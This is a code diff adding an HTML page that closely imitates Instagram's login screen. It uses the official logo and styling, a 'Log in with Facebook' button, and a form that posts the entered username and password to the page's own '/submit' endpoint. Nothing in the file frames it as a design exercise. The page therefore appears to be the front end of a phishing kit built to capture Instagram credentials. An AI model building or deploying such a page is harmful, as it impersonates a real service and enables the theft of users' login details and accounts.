@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Roboto+Slab:wght@400&display=swap"
+        rel="stylesheet">
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 5px;
+            width: 350px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, .1);
+        }
+
+        .logo {
+            text-align: center;
+            padding: 40px 0;
+        }
+
+        .logo img {
+            width: 175px;
+            height: auto;
+        }
+
+        .form {
+            padding: 0 40px 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 12px 0;
+            font-size: 12px;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        .or-divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #dbdbdb;
+        }
+
+        .or-divider hr {
+            border: 0;
+            border-top: 1px solid #dbdbdb;
+            margin: 0;
+        }
+
+        .or-text {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .signup-link {
+            text-align: center;
+            font-size: 14px;
+            padding: 16px;
+            color: #00376b;
+        }
+
+        .signup-link a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .app-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .app-link a {
+            color: #00376b;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- Instagram Logo -->
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/800px-Instagram_logo_2022.svg.png"
+                alt="Instagram">
+        </div>
+
+        <!-- Login Form -->
+        <div class="form">
+            <form action="/submit" method="POST">
+                <input type="text" placeholder="Phone number, username, or email" name="username" required>
+                <input type="password" placeholder="Password" name="password" required>
+                <button type="submit">Log In</button>
+            </form>
+
+            <!-- Forgot Password Link -->
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+
+            <!-- Or Divider -->
+            <div class="or-divider">
+                <hr>
+                <span class="or-text">OR</span>
+            </div>
+
+            <!-- Log in with Facebook -->
+            <button style="background-color: #4c69ba; color: white;">Log in with Facebook</button>
+
+            <!-- Sign Up Link -->
+            <div class="signup-link">
+                <span>Don't have an account? <a href="#">Sign up</a></span>
+            </div>
+        </div>
+
+        <!-- Instagram App Link -->
+        <div class="app-link">
+            <span>Get the app.</span><br>
+            <a href="#">Android</a> • <a href="#">iOS</a>
+        </div>
+    </div>
+
+</body>
+
+</html>
